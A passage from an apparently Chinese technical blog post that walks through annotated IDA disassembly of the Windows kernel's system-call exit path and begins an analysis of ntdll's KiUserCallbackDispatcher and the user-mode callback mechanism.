class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0059479</span>E _KiServiceExit:                         <span class="comment">// CODE XREF: KiCallUserMode(x,x,x,x)+160↑j</span></span><br><span class="line">.text:<span class="number">0059479</span>E                                         <span class="comment">// NtContinue(x,x)+AC↓j ...</span></span><br><span class="line">.text:<span class="number">0059479</span>E                 cli                     <span class="comment">// ESP0，EBP0指向输出缓冲区中的TrapFrame</span></span><br><span class="line">.text:<span class="number">0059479</span>E                                         <span class="comment">// 关闭中断</span></span><br><span class="line">.text:<span class="number">0059479F</span>                 test    byte ptr [ebp+(_KTRAP_FRAME.EFlags+<span class="number">2</span>)], <span class="number">2</span> <span class="comment">// v86</span></span><br><span class="line">.text:<span class="number">005947</span>A3                 jnz     <span class="keyword">short</span> loc_5947AB</span><br><span class="line">.text:<span class="number">005947</span>A5                 test    byte ptr [ebp+_KTRAP_FRAME.SegCs], <span class="number">1</span> <span class="comment">// 先前模式</span></span><br><span class="line">.text:<span class="number">005947</span>A9                 jz      <span class="keyword">short</span> loc_594824 <span class="comment">// 因为我们是从 0 环进行的回调，所以先前模式为 0</span></span><br><span class="line">.text:<span class="number">005947</span>AB</span><br><span class="line">.text:<span class="number">005947</span>AB loc_5947AB:                             <span class="comment">// CODE XREF: sub_59437F+424↑j</span></span><br><span class="line">.text:<span class="number">005947</span>AB                                         <span class="comment">// sub_59437F+4A0↓j</span></span><br><span class="line">.text:<span class="number">005947</span>AB                 mov     ebx, large fs:<span class="number">124</span>h</span><br><span class="line">.text:<span class="number">005947B</span>2                 test    byte ptr [ebx+<span class="number">2</span>], <span class="number">81</span>h</span><br><span class="line">.text:<span class="number">005947B</span>6                 jz      <span class="keyword">short</span> loc_5947DD</span><br><span class="line">.text:<span class="number">005947B</span>8                 push    eax</span><br><span class="line">.text:<span class="number">005947B</span>9                 test    byte ptr [ebx+<span class="number">2</span>], <span class="number">1</span></span><br><span class="line">.text:<span class="number">005947B</span>D                 jz      <span class="keyword">short</span> loc_5947CB</span><br><span class="line">.text:<span class="number">005947B</span>F                 push    ebx</span><br><span class="line">.text:<span class="number">005947</span>C0                 call    _KiCopyCounters@<span class="number">4</span> <span class="comment">// KiCopyCounters(x)</span></span><br><span class="line">.text:<span class="number">005947</span>C5                 test    byte ptr [ebx+<span class="number">2</span>], <span class="number">80</span>h</span><br><span class="line">.text:<span class="number">005947</span>C9                 jz      <span class="keyword">short</span> loc_5947DC</span><br><span class="line">.text:<span class="number">005947</span>CB</span><br><span class="line">.text:<span class="number">005947</span>CB loc_5947CB:                             <span class="comment">// CODE XREF: sub_59437F+43E↑j</span></span><br><span class="line">.text:<span class="number">005947</span>CB                 test    byte ptr [ebx+<span class="number">86</span>h], <span class="number">3</span></span><br><span class="line">.text:<span class="number">005947</span>D2                 jnz     <span class="keyword">short</span> loc_5947DC</span><br><span class="line">.text:<span class="number">005947</span>D4                 push    <span class="number">1</span></span><br><span class="line">.text:<span class="number">005947</span>D6                 push    ebp</span><br><span class="line">.text:<span class="number">005947</span>D7                 call    _KiSetupForInstrumentationReturn@<span class="number">8</span> <span class="comment">// KiSetupForInstrumentationReturn(x,x)</span></span><br><span class="line">.text:<span class="number">005947</span>DC</span><br><span class="line">.text:<span class="number">005947</span>DC loc_5947DC:                             <span class="comment">// CODE XREF: sub_59437F+44A↑j</span></span><br><span class="line">.text:<span class="number">005947</span>DC                                         <span class="comment">// sub_59437F+453↑j</span></span><br><span class="line">.text:<span class="number">005947</span>DC                 pop     eax</span><br><span class="line">.text:<span class="number">005947</span>DD</span><br><span class="line">.text:<span class="number">005947</span>DD loc_5947DD:                             <span class="comment">// CODE XREF: sub_59437F+437↑j</span></span><br><span class="line">.text:<span class="number">005947</span>DD                 mov     byte ptr [ebx+<span class="number">56</span>h], <span class="number">0</span></span><br><span class="line">.text:<span class="number">005947E1</span>                 test    byte ptr [ebx+<span class="number">86</span>h], <span class="number">3</span></span><br><span class="line">.text:<span class="number">005947E8</span>                 jz      <span class="keyword">short</span> loc_594824</span><br><span class="line">.text:<span class="number">005947</span>EA                 mov     ebx, ebp</span><br><span class="line">.text:<span class="number">005947</span>EC                 mov     [ebx+<span class="number">40</span>h], eax</span><br><span class="line">.text:<span class="number">005947</span>EF                 mov     dword ptr [ebx+<span class="number">34</span>h], <span class="number">23</span>h</span><br><span class="line">.text:<span class="number">005947F</span>6                 mov     dword ptr [ebx+<span class="number">30</span>h], <span class="number">23</span>h</span><br><span class="line">.text:<span class="number">005947F</span>D                 mov     ecx, <span class="number">1</span>          <span class="comment">// NewIrql</span></span><br><span class="line">.text:<span class="number">00594802</span>                 call    ds:__imp_@KfRaiseIrql@<span class="number">4</span> <span class="comment">// KfRaiseIrql(x)</span></span><br><span class="line">.text:<span class="number">00594808</span>                 push    eax</span><br><span class="line">.text:<span class="number">00594809</span>                 sti</span><br><span class="line">.text:<span class="number">0059480</span>A                 push    ebx</span><br><span class="line">.text:<span class="number">0059480B</span>                 push    <span class="number">0</span></span><br><span class="line">.text:<span class="number">0059480</span>D                 push    <span class="number">1</span></span><br><span class="line">.text:<span class="number">0059480F</span>                 call    _KiDeliverApc@<span class="number">12</span> <span class="comment">// KiDeliverApc(x,x,x)</span></span><br><span class="line">.text:<span class="number">00594814</span>                 pop     ecx             <span class="comment">// NewIrql</span></span><br><span class="line">.text:<span class="number">00594815</span>                 call    ds:__imp_@KfLowerIrql@<span class="number">4</span> <span class="comment">// KfLowerIrql(x)</span></span><br><span class="line">.text:<span class="number">0059481B</span>                 mov     eax, [ebx+<span class="number">40</span>h]</span><br><span class="line">.text:<span class="number">0059481</span>E                 cli</span><br><span class="line">.text:<span class="number">0059481F</span>                 jmp     <span class="keyword">short</span> loc_5947AB</span><br><span class="line">.text:<span class="number">0059481F</span> <span class="comment">// ---------------------------------------------------------------------------</span></span><br><span class="line">.text:<span class="number">00594821</span>                 align <span class="number">4</span></span><br><span class="line">.text:<span class="number">00594824</span></span><br><span class="line">.text:<span class="number">00594824</span> loc_594824:                             <span class="comment">// CODE XREF: sub_59437F+42A↑j</span></span><br><span class="line">.text:<span class="number">00594824</span>                                         <span class="comment">// sub_59437F+469↑j</span></span><br><span class="line">.text:<span class="number">00594824</span>                 mov     edx, [ebp+_KTRAP_FRAME.ExceptionList]</span><br><span class="line">.text:<span class="number">00594827</span>                 ldmxcsr [ebp+_KTRAP_FRAME._MxCsr]</span><br><span class="line">.text:<span class="number">0059482B</span>                 mov     large fs:_KPCR, edx</span><br><span class="line">.text:<span class="number">00594832</span>                 mov     esi, large fs:_KPCR.PrcbData.CurrentThread</span><br><span class="line">.text:<span class="number">00594839</span>                 movzx   ecx, [ebp+_KTRAP_FRAME.PreviousPreviousMode]</span><br><span class="line">.text:<span class="number">0059483</span>D                 mov     [esi+_KTHREAD.___u47.__s1.PreviousMode], cl</span><br><span class="line">.text:<span class="number">00594843</span>                 test    [ebp+_KTRAP_FRAME.Dr7], <span class="number">0F</span>FFF23FFh <span class="comment">// 先排开测DR7的保留位</span></span><br><span class="line">.text:<span class="number">00594843</span>                                         <span class="comment">// 然后测试DR7是否有某一位已经被置位</span></span><br><span class="line">.text:<span class="number">00594843</span>                                         <span class="comment">// 如果有，说明有硬件断点需要处理</span></span><br><span class="line">.text:<span class="number">0059484</span>A                 jnz     loc_594964      <span class="comment">// 处理硬件断点</span></span><br><span class="line">.text:<span class="number">00594850</span></span><br><span class="line">.text:<span class="number">00594850</span> loc_594850:                             <span class="comment">// CODE XREF: sub_59437F+5F5↓j</span></span><br><span class="line">.text:<span class="number">00594850</span>                                         <span class="comment">// sub_59437F+624↓j</span></span><br><span class="line">.text:<span class="number">00594850</span>                 test    [ebp+_KTRAP_FRAME.EFlags], <span class="number">20000</span>h <span class="comment">// Eflags.VM</span></span><br><span class="line">.text:<span class="number">00594857</span>                 jnz     loc_595F74      <span class="comment">// v86模式</span></span><br><span class="line">.text:<span class="number">0059485</span>D                 test    word ptr [ebp+_KTRAP_FRAME.SegCs], <span class="number">0F</span>FF9h <span class="comment">// 应该是判断先前模式，因为 3 环CS最后一位为 1</span></span><br><span class="line">.text:<span class="number">00594863</span>                 jz      loc_5949A8      <span class="comment">// CS 最低位为0</span></span><br><span class="line">.text:<span class="number">00594869</span>                 mov     [ebp+_KTRAP_FRAME._Eax], eax</span><br><span class="line">.text:<span class="number">0059486</span>C                 test    byte ptr [ebp+_KTRAP_FRAME.SegCs], <span class="number">1</span></span><br><span class="line">.text:<span class="number">00594870</span>                 jz      <span class="keyword">short</span> loc_5948AC</span><br><span class="line">.text:<span class="number">00594872</span>                 movzx   eax, large byte ptr fs:<span class="number">22</span>DDh</span><br><span class="line">.text:<span class="number">0059487</span>A                 cmp     large fs:<span class="number">22</span>DAh, al</span><br><span class="line">.text:<span class="number">00594881</span>                 jz      <span class="keyword">short</span> loc_594892</span><br><span class="line">.text:<span class="number">00594883</span>                 mov     large fs:<span class="number">22</span>DAh, al</span><br><span class="line">.text:<span class="number">00594889</span>                 mov     ecx, <span class="number">48</span>h</span><br><span class="line">.text:<span class="number">0059488</span>E                 <span class="keyword">xor</span>     edx, edx</span><br><span class="line">.text:<span class="number">00594890</span>                 wrmsr</span><br><span class="line">.text:<span class="number">00594892</span></span><br><span class="line">.text:<span class="number">00594892</span> loc_594892:                             <span class="comment">// CODE XREF: sub_59437F+502↑j</span></span><br><span class="line">.text:<span class="number">00594892</span>                 btr     large word ptr fs:<span class="number">22</span>D8h, <span class="number">2</span></span><br><span class="line">.text:<span class="number">0059489</span>C                 jnb     <span class="keyword">short</span> loc_5948AC</span><br><span class="line">.text:<span class="number">0059489</span>E                 mov     eax, <span class="number">1</span></span><br><span class="line">.text:<span class="number">005948</span>A3                 <span class="keyword">xor</span>     edx, edx</span><br><span class="line">.text:<span class="number">005948</span>A5                 mov     ecx, <span class="number">49</span>h</span><br><span class="line">.text:<span class="number">005948</span>AA                 wrmsr</span><br><span class="line">.text:<span class="number">005948</span>AC</span><br><span class="line">.text:<span class="number">005948</span>AC loc_5948AC:                             <span class="comment">// CODE XREF: sub_59437F+4F1↑j</span></span><br><span class="line">.text:<span class="number">005948</span>AC                                         <span class="comment">// sub_59437F+51D↑j</span></span><br><span class="line">.text:<span class="number">005948</span>AC                 xorps   xmm0, xmm0</span><br><span class="line">.text:<span class="number">005948</span>AF                 xorps   xmm1, xmm1</span><br><span class="line">.text:<span class="number">005948B</span>2                 xorps   xmm2, xmm2</span><br><span class="line">.text:<span class="number">005948B</span>5                 xorps   xmm3, xmm3</span><br><span class="line">.text:<span class="number">005948B</span>8                 xorps   xmm4, xmm4</span><br><span class="line">.text:<span class="number">005948B</span>B                 xorps   xmm5, xmm5</span><br><span class="line">.text:<span class="number">005948B</span>E                 xorps   xmm6, xmm6</span><br><span class="line">.text:<span class="number">005948</span>C1                 xorps   xmm7, xmm7</span><br><span class="line">.text:<span class="number">005948</span>C4                 mov     eax, [ebp+<span class="number">40</span>h]</span><br><span class="line">.text:<span class="number">005948</span>C7                 cmp     word ptr [ebp+<span class="number">6</span>Ch], <span class="number">8</span></span><br><span class="line">.text:<span class="number">005948</span>CC                 jz      <span class="keyword">short</span> loc_5948F9</span><br><span class="line">.text:<span class="number">005948</span>CE                 lea     esp, [ebp+<span class="number">2</span>Ch]</span><br><span class="line">.text:<span class="number">005948</span>D1                 pop     gs</span><br><span class="line">.text:<span class="number">005948</span>D3                 assume gs:nothing</span><br><span class="line">.text:<span class="number">005948</span>D3                 test    ss:_KiKvaShadow, <span class="number">1</span></span><br><span class="line">.text:<span class="number">005948</span>DB                 jz      <span class="keyword">short</span> loc_5948F4</span><br><span class="line">.text:<span class="number">005948</span>DD                 mov     ebx, [ebp+<span class="number">50</span>h]</span><br><span class="line">.text:<span class="number">005948E0</span>                 mov     large dword ptr fs:<span class="number">5020</span>h, <span class="number">0</span></span><br><span class="line">.text:<span class="number">005948</span>EB                 mov     large fs:<span class="number">5018</span>h, ebx</span><br><span class="line">.text:<span class="number">005948F</span>2                 jmp     <span class="keyword">short</span> loc_5948F9</span><br><span class="line">.text:<span class="number">005948F</span>4 <span class="comment">// ---------------------------------------------------------------------------</span></span><br><span class="line">.text:<span class="number">005948F</span>4</span><br><span class="line">.text:<span class="number">005948F</span>4 loc_5948F4:                             <span class="comment">// CODE XREF: sub_59437F+55C↑j</span></span><br><span class="line">.text:<span class="number">005948F</span>4                 lea     esp, [ebp+<span class="number">50</span>h]</span><br><span class="line">.text:<span class="number">005948F</span>7                 pop     fs</span><br><span class="line">.text:<span class="number">005948F</span>9                 assume fs:nothing</span><br><span class="line">.text:<span class="number">005948F</span>9</span><br><span class="line">.text:<span class="number">005948F</span>9 loc_5948F9:                             <span class="comment">// CODE XREF: sub_59437F+54D↑j</span></span><br><span class="line">.text:<span class="number">005948F</span>9                                         <span class="comment">// sub_59437F+573↑j</span></span><br><span class="line">.text:<span class="number">005948F</span>9                 lea     esp, [ebp+<span class="number">54</span>h]</span><br><span class="line">.text:<span class="number">005948F</span>C                 pop     edi</span><br><span class="line">.text:<span class="number">005948F</span>D                 pop     esi</span><br><span class="line">.text:<span class="number">005948F</span>E                 pop     ebx</span><br><span class="line">.text:<span class="number">005948F</span>F                 pop     ebp</span><br><span class="line">.text:<span class="number">00594900</span>                 add     esp, <span class="number">4</span></span><br><span class="line">.text:<span class="number">00594903</span>                 test    [esp<span class="number">-64</span>h+arg_64], <span class="number">1</span></span><br><span class="line">.text:<span class="number">0059490B</span></span><br><span class="line">.text:<span class="number">0059490B</span> _KiSystemCallExitBranch:                <span class="comment">// DATA XREF: KiEnableFastSyscallReturn():loc_562800↑r</span></span><br><span class="line">.text:<span class="number">0059490B</span>                                         <span class="comment">// KiEnableFastSyscallReturn()+38↑w</span></span><br><span class="line">.text:<span class="number">0059490B</span>                 jnz     <span class="keyword">short</span> _KiSystemCallExit</span><br><span class="line">.text:<span class="number">0059490</span>D                 pop     edx</span><br><span class="line">.text:<span class="number">0059490</span>E                 pop     ecx</span><br><span class="line">.text:<span class="number">0059490F</span>                 popf</span><br><span class="line">.text:<span class="number">00594910</span>                 jmp     edx</span><br><span class="line">.text:<span class="number">00594912</span> <span class="comment">// ---------------------------------------------------------------------------</span></span><br><span class="line">.text:<span class="number">00594912</span></span><br><span class="line">.text:<span class="number">00594912</span> _KiSystemCallExit2:                     <span class="comment">// DATA XREF: KeRestoreProcessorSpecificFeatures():loc_54FA1B↑o</span></span><br><span class="line">.text:<span class="number">00594912</span>                                         <span class="comment">// KiInitMachineDependent()+E4↓o</span></span><br><span class="line">.text:<span class="number">00594912</span>                 test    [esp<span class="number">-70</span>h+arg_74], <span class="number">100</span>h</span><br><span class="line">.text:<span class="number">0059491</span>A                 jnz     <span class="keyword">short</span> _KiSystemCallExit</span><br><span class="line">.text:<span class="number">0059491</span>C                 pop     edx</span><br><span class="line">.text:<span class="number">0059491</span>D                 add     esp, <span class="number">4</span></span><br><span class="line">.text:<span class="number">00594920</span>                 <span class="keyword">and</span>     [esp<span class="number">-78</span>h+arg_74], <span class="number">0F</span>FFFFDFFh</span><br><span class="line">.text:<span class="number">00594927</span>                 popf</span><br><span class="line">.text:<span class="number">00594928</span>                 pop     ecx</span><br><span class="line">.text:<span class="number">00594929</span>                 test    ss:_KiKvaShadow, <span class="number">1</span></span><br><span class="line">.text:<span class="number">00594931</span>                 jnz     _KiKernelSysretExit</span><br><span class="line">.text:<span class="number">00594937</span>                 sti</span><br><span class="line">.text:<span class="number">00594938</span>                 sysexit</span><br><span class="line">.text:<span class="number">0059493</span>A</span><br><span class="line">.text:<span class="number">0059493</span>A _KiSystemCallExit:                      <span class="comment">// CODE XREF: sub_59437F:_KiSystemCallExitBranch↑j</span></span><br><span class="line">.text:<span class="number">0059493</span>A                                         <span class="comment">// sub_59437F+59B↑j</span></span><br><span class="line">.text:<span class="number">0059493</span>A                                         <span class="comment">// DATA XREF: ...</span></span><br><span class="line">.text:<span class="number">0059493</span>A                 <span class="keyword">xor</span>     ecx, ecx</span><br><span class="line">.text:<span class="number">0059493</span>C                 <span class="keyword">xor</span>     edx, edx</span><br><span class="line">.text:<span class="number">0059493</span>E                 test    ss:_KiKvaShadow, <span class="number">1</span></span><br><span class="line">.text:<span class="number">00594946</span>                 jz      <span class="keyword">short</span> locret_594962</span><br><span class="line">.text:<span class="number">00594948</span>                 test    dword ptr [esp+<span class="number">8</span>], <span class="number">20000</span>h</span><br><span class="line">.text:<span class="number">00594950</span>                 jnz     _KiKernelExit</span><br><span class="line">.text:<span class="number">00594956</span>                 cmp     word ptr [esp<span class="number">-74</span>h+arg_74], <span class="number">8</span></span><br><span class="line">.text:<span class="number">0059495</span>C                 jnz     _KiKernelExit</span><br><span class="line">.text:<span class="number">00594962</span></span><br><span class="line">.text:<span class="number">00594962</span> locret_594962:                          <span class="comment">// CODE XREF: sub_59437F+5C7↑j</span></span><br><span class="line">.text:<span class="number">00594962</span>                 iret</span><br><span class="line">.text:<span class="number">00594962</span> <span class="comment">// ---------------------------------------------------------------------------</span></span><br><span class="line">.text:<span class="number">00594963</span>                 align <span class="number">4</span></span><br><span class="line">.text:<span class="number">00594964</span></span><br><span class="line">.text:<span class="number">00594964</span> loc_594964:                             <span class="comment">// CODE XREF: sub_59437F+4CB↑j</span></span><br><span class="line">.text:<span class="number">00594964</span>                 test    dword ptr [ebp+<span class="number">70</span>h], <span class="number">20000</span>h <span class="comment">// 处理硬件断点</span></span><br><span class="line">.text:<span class="number">0059496B</span>                 jnz     <span class="keyword">short</span> loc_59497A</span><br><span class="line">.text:<span class="number">0059496</span>D                 test    dword ptr [ebp+<span class="number">6</span>Ch], <span class="number">1</span></span><br><span class="line">.text:<span class="number">00594974</span>                 jz      loc_594850      <span class="comment">// Eflags.VM</span></span><br><span class="line">.text:<span class="number">0059497</span>A</span><br><span class="line">.text:<span class="number">0059497</span>A loc_59497A:                             <span class="comment">// CODE XREF: sub_59437F+5EC↑j</span></span><br><span class="line">.text:<span class="number">0059497</span>A                 <span class="keyword">xor</span>     ebx, ebx</span><br><span class="line">.text:<span class="number">0059497</span>C                 mov     esi, [ebp+<span class="number">14</span>h]</span><br><span class="line">.text:<span class="number">0059497F</span>                 mov     edi, [ebp+<span class="number">18</span>h]</span><br><span class="line">.text:<span class="number">00594982</span>                 mov     dr7, ebx</span><br><span class="line">.text:<span class="number">00594985</span>                 mov     dr0, esi</span><br><span class="line">.text:<span class="number">00594988</span>                 mov     ebx, [ebp+<span class="number">1</span>Ch]</span><br><span class="line">.text:<span class="number">0059498B</span>                 mov     dr1, edi</span><br><span class="line">.text:<span class="number">0059498</span>E                 mov     dr2, ebx</span><br><span class="line">.text:<span class="number">00594991</span>                 mov     esi, [ebp+<span class="number">20</span>h]</span><br><span class="line">.text:<span class="number">00594994</span>                 mov     edi, [ebp+<span class="number">24</span>h]</span><br><span class="line">.text:<span class="number">00594997</span>                 mov     ebx, [ebp+<span class="number">28</span>h]</span><br><span class="line">.text:<span class="number">0059499</span>A                 mov     dr3, esi</span><br><span class="line">.text:<span class="number">0059499</span>D                 mov     dr6, edi</span><br><span class="line">.text:<span class="number">005949</span>A0                 mov     dr7, ebx</span><br><span class="line">.text:<span class="number">005949</span>A3                 jmp     loc_594850      <span class="comment">// Eflags.VM</span></span><br><span class="line">.text:<span class="number">005949</span>A8 <span class="comment">// ---------------------------------------------------------------------------</span></span><br><span class="line">.text:<span class="number">005949</span>A8</span><br><span class="line">.text:<span class="number">005949</span>A8 loc_5949A8:                             <span class="comment">// CODE XREF: sub_59437F+4E4↑j</span></span><br><span class="line">.text:<span class="number">005949</span>A8                 movzx   ebx, [ebp+_KTRAP_FRAME.TempSegCs] <span class="comment">// CS 最低位为0</span></span><br><span class="line">.text:<span class="number">005949</span>AC                 mov     [ebp+_KTRAP_FRAME.SegCs], ebx</span><br><span class="line">.text:<span class="number">005949</span>AF                 mov     ebx, [ebp+_KTRAP_FRAME.TempEsp]</span><br><span class="line">.text:<span class="number">005949B</span>2                 sub     ebx, <span class="number">0</span>Ch        <span class="comment">// ebx 指向 TrapFrame.DbgArgMark</span></span><br><span class="line">.text:<span class="number">005949B</span>5                 mov     [ebp+_KTRAP_FRAME.ErrCode], ebx</span><br><span class="line">.text:<span class="number">005949B</span>8                 mov     esi, [ebp+_KTRAP_FRAME.EFlags]</span><br><span class="line">.text:<span class="number">005949B</span>B                 mov     [ebx+<span class="number">8</span>], esi</span><br><span class="line">.text:<span class="number">005949B</span>E                 mov     esi, [ebp+_KTRAP_FRAME.SegCs]</span><br><span class="line">.text:<span class="number">005949</span>C1                 mov     [ebx+<span class="number">4</span>], esi</span><br><span class="line">.text:<span class="number">005949</span>C4                 mov     esi, [ebp+_KTRAP_FRAME._Eip]</span><br><span class="line">.text:<span class="number">005949</span>C7                 mov     [ebx], esi</span><br><span class="line">.text:<span class="number">005949</span>C9                 lea     esp, [ebp+_KTRAP_FRAME._Edi]</span><br><span class="line">.text:<span class="number">005949</span>CC                 pop     edi</span><br><span class="line">.text:<span class="number">005949</span>CD                 pop     esi</span><br><span class="line">.text:<span class="number">005949</span>CE                 pop     ebx</span><br><span class="line">.text:<span class="number">005949</span>CF                 pop     ebp</span><br><span class="line">.text:<span class="number">005949</span>D0                 mov     esp, [esp<span class="number">-60</span>h+arg_5C]</span><br><span class="line">.text:<span class="number">005949</span>D3                 iret</span><br><span class="line">.text:<span class="number">005949</span>D4 <span class="comment">// ---------------------------------------------------------------------------</span></span><br><span class="line">.text:<span class="number">005949</span>D4</span><br><span class="line">.text:<span class="number">005949</span>D4 loc_5949D4:                             <span class="comment">// CODE XREF: sub_59437F+3A0↑j</span></span><br><span class="line">.text:<span class="number">005949</span>D4                 mov     eax, <span class="number">0</span>C0000005h</span><br><span class="line">.text:<span class="number">005949</span>D9                 jmp     _KiSystemServicePostCall@<span class="number">0</span> <span class="comment">// KiSystemServicePostCall()</span></span><br><span class="line">.text:<span class="number">005949</span>DE <span class="comment">// ---------------------------------------------------------------------------</span></span><br><span class="line">.text:<span class="number">005949</span>DE</span><br><span class="line">.text:<span class="number">005949</span>DE loc_5949DE:                             <span class="comment">// CODE XREF: sub_59437F+3DC↑j</span></span><br><span class="line">.text:<span class="number">005949</span>DE                 push    large dword ptr fs:<span class="number">24</span>h</span><br><span class="line">.text:<span class="number">005949E5</span>                 mov     large byte ptr fs:<span class="number">24</span>h, <span class="number">0</span></span><br><span class="line">.text:<span class="number">005949</span>ED                 cli</span><br><span class="line">.text:<span class="number">005949</span>EE                 push    ebp</span><br><span class="line">.text:<span class="number">005949</span>EF                 push    <span class="number">0</span></span><br><span class="line">.text:<span class="number">005949F</span>1                 push    <span class="number">0</span></span><br><span class="line">.text:<span class="number">005949F</span>3                 push    eax</span><br><span class="line">.text:<span class="number">005949F</span>4                 push    ebx</span><br><span class="line">.text:<span class="number">005949F</span>5                 push    <span class="number">4</span>Ah</span><br><span class="line">.text:<span class="number">005949F</span>7                 call    _KiBugCheck2@<span class="number">24</span> <span class="comment">// KiBugCheck2(x,x,x,x,x,x)</span></span><br><span class="line">.text:<span class="number">005949F</span>C <span class="comment">// ---------------------------------------------------------------------------</span></span><br><span class="line">.text:<span class="number">005949F</span>C</span><br><span class="line">.text:<span class="number">005949F</span>C loc_5949FC:                             <span class="comment">// CODE XREF: sub_59437F+3F2↑j</span></span><br><span class="line">.text:<span class="number">005949F</span>C                                         <span class="comment">// sub_59437F+400↑j</span></span><br><span class="line">.text:<span class="number">005949F</span>C                 movzx   eax, byte ptr [ecx+<span class="number">16</span>Ah]</span><br><span class="line">.text:<span class="number">00594</span>A03                 mov     edx, [ecx+<span class="number">13</span>Ch]</span><br><span class="line">.text:<span class="number">00594</span>A09                 push    ebp</span><br><span class="line">.text:<span class="number">00594</span>A0A                 push    <span class="number">0</span></span><br><span class="line">.text:<span class="number">00594</span>A0C                 push    edx</span><br><span class="line">.text:<span class="number">00594</span>A0D                 push    eax</span><br><span class="line">.text:<span class="number">00594</span>A0E                 push    ebx</span><br><span class="line">.text:<span class="number">00594</span>A0F                 push    <span class="number">1</span></span><br><span class="line">.text:<span class="number">00594</span>A11                 call    _KiBugCheck2@<span class="number">24</span> <span class="comment">// KiBugCheck2(x,x,x,x,x,x)</span></span><br><span class="line">.text:<span class="number">00594</span>A16 <span class="comment">// ---------------------------------------------------------------------------</span></span><br><span class="line">.text:<span class="number">00594</span>A16                 retn</span><br><span class="line">.text:<span class="number">00594</span>A17 <span class="comment">// ---------------------------------------------------------------------------</span></span><br><span class="line">.text:<span class="number">00594</span>A17</span><br><span class="line">.text:<span class="number">00594</span>A17 loc_594A17:                             <span class="comment">// CODE XREF: sub_59437F+3C4↑j</span></span><br><span class="line">.text:<span class="number">00594</span>A17                 mov     ecx, ebx</span><br><span class="line">.text:<span class="number">00594</span>A19                 call    @PerfInfoLogSysCallEntry@<span class="number">4</span> <span class="comment">// PerfInfoLogSysCallEntry(x)</span></span><br><span class="line">.text:<span class="number">00594</span>A1E                 jmp     loc_594749</span><br><span class="line">.text:<span class="number">00594</span>A23 <span class="comment">// ---------------------------------------------------------------------------</span></span><br><span class="line">.text:<span class="number">00594</span>A23</span><br><span class="line">.text:<span class="number">00594</span>A23 loc_594A23:                             <span class="comment">// CODE XREF: sub_59437F+40C↑j</span></span><br><span class="line">.text:<span class="number">00594</span>A23                 push    eax</span><br><span class="line">.text:<span class="number">00594</span>A24                 mov     ecx, eax</span><br><span class="line">.text:<span class="number">00594</span>A26                 call    @PerfInfoLogSysCallExit@<span class="number">4</span> <span class="comment">// PerfInfoLogSysCallExit(x)</span></span><br><span class="line">.text:<span class="number">00594</span>A2B                 pop     eax</span><br><span class="line">.text:<span class="number">00594</span>A2C                 jmp     loc_594791</span><br><span class="line">.text:<span class="number">00594</span>A2C sub_59437F      endp <span class="comment">// sp-analysis failed</span></span><br></pre></td></tr></table></figure>



<h3 id="4-5-KiUserCallbackDispatcher函数分析"><a href="#4-5-KiUserCallbackDispatcher函数分析" class="headerlink" title="4.5 KiUserCallbackDispatcher函数分析"></a>4.5 KiUserCallbackDispatcher函数分析</h3><p>该函数主要：</p>
<ol>
<li>取到在 <code>KeUserModeCallback</code> 函数最后更新的 <code>TrapFrame.Esp3</code>。</li>
<li>填充 3 环堆栈（参考下面的图）。</li>
<li>取到堆栈中的 <code>ApiNumber</code>，然后去 <code>PEB.KernelCallbackTable</code> 取到回调函数的地址。</li>
<li>调用回调函数。</li>
<li>调用 <code>ntdll!ZwCallbackReturn</code>。</li>
</ol>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">6</span>A292670 <span class="comment">// =============== S U B R O U T I N E =======================================</span></span><br><span class="line">.text:<span class="number">6</span>A292670</span><br><span class="line">.text:<span class="number">6</span>A292670 <span class="comment">// VOID KiUserCallbackDispatcher(</span></span><br><span class="line">.text:<span class="number">6</span>A292670 <span class="comment">//     IN PVOID CallbackArgument</span></span><br><span class="line">.text:<span class="number">6</span>A292670 <span class="comment">//     IN ULONG CallbackIndex</span></span><br><span class="line">.text:<span class="number">6</span>A292670 <span class="comment">//     )</span></span><br><span class="line">.text:<span class="number">6</span>A292670</span><br><span class="line">.text:<span class="number">6</span>A292670 <span class="comment">// __stdcall KiUserCallbackDispatcher(x, x, x)</span></span><br><span class="line">.text:<span class="number">6</span>A292670                 <span class="keyword">public</span> _KiUserCallbackDispatcher@<span class="number">12</span></span><br><span class="line">.text:<span class="number">6</span>A292670 _KiUserCallbackDispatcher@<span class="number">12</span> proc near  <span class="comment">// DATA XREF: .text:6A2036FC↑o</span></span><br><span class="line">.text:<span class="number">6</span>A292670                                         <span class="comment">// .text:off_6A309FA8↓o</span></span><br><span class="line">.text:<span class="number">6</span>A292670</span><br><span class="line">.text:<span class="number">6</span>A292670 arg_ExceptionList= dword ptr  <span class="number">10</span>h</span><br><span class="line">.text:<span class="number">6</span>A292670 arg_10          = dword ptr  <span class="number">14</span>h</span><br><span class="line">.text:<span class="number">6</span>A292670</span><br><span class="line">.text:<span class="number">6</span>A292670                 cmp     _LdrDelegatedKiUserCallbackDispatcher, <span class="number">0</span></span><br><span class="line">.text:<span class="number">6</span>A292677                 jz      <span class="keyword">short</span> loc_6A292687</span><br><span class="line">.text:<span class="number">6</span>A292679                 mov     ecx, _LdrDelegatedKiUserCallbackDispatcher</span><br><span class="line">.text:<span class="number">6</span>A29267F                 call    ds:___guard_check_icall_fptr <span class="comment">// RtlpHpAppCompatDontChangePolicy()</span></span><br><span class="line">.text:<span class="number">6</span>A292685                 jmp     